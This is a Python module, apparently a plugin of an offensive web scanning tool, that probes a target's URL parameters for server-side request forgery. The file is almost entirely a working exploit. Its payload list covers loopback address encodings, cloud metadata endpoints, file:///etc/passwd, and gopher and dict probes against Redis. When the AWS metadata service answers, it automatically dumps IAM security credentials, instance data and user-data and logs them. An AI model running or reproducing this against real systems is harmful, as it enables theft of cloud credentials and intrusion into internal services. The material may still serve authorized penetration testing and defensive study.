"""ssrf — SSRF probe + inline cloud metadata dump (v3)"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient

PAYLOADS = [
    "http://127.0.0.1/","http://localhost/","http://[::1]/",
    "http://0.0.0.0/","http://0x7f000001/","http://0177.0.0.1/","http://2130706433/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "file:///etc/passwd","file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
    "http://127.0.0.1:6379/","http://127.0.0.1:11211/",
    "http://127.0.0.1:9200/","http://127.0.0.1:2375/version",
    "http://127.0.0.1:8080/","http://127.0.0.1:8000/",
]

MARKERS = [
    "ami-id","instance-id","security-credentials","computeMetadata","vmId",
    "root:x:0:0","redis_version","elasticsearch","memcached","docker",
    "project-id","service-accounts","localhost","127.0.0.1",
    "AccessKeyId","SecretAccessKey","Token",
]

class Ssrf:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        params = parse_qs(u.query) or {"url": ["http://example.com"]}

        print(f"[ssrf] {len(PAYLOADS)} payloads on {list(params.keys())}")
        findings = []
        vuln_param = None

        for name in params:
            for p in PAYLOADS:
                q = dict(params); q[name] = [p]
                url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                headers = {"Metadata-Flavor":"Google"} if "google" in p else {}
                r = http.get(url, headers=headers)
                if not r: continue
                for m in MARKERS:
                    if m in r.text:
                        findings.append({"param":name,"payload":p,"marker":m})
                        print(f"  [!] SSRF: {name}={p[:60]} -> {m}")
                        logger.finding("ssrf","critical",f"{name}={p[:60]} marker={m}")
                        vuln_param = name
                        break

        print(f"[ssrf] {len(findings)} findings")

        # if AWS metadata reachable — full credential dump
        if vuln_param and any("169.254.169.254" in f["payload"] for f in findings):
            print(f"\n[ssrf] AWS metadata reachable — dumping credentials")
            for path in ["/latest/meta-data/iam/security-credentials/",
                         "/latest/meta-data/instance-id",
                         "/latest/meta-data/local-ipv4",
                         "/latest/user-data"]:
                test = f"http://169.254.169.254{path}"
                q = dict(params); q[vuln_param] = [test]
                r = http.get(urlunparse(u._replace(query=urlencode(q, doseq=True))))
                if r and r.status_code == 200 and len(r.text) > 10:
                    print(f"  [+] {path}")
                    print(f"      {r.text[:200].strip()}")
                    logger.finding("ssrf_aws","critical",f"{path}: {r.text[:200]}")

        return {"findings": findings, "param": vuln_param}
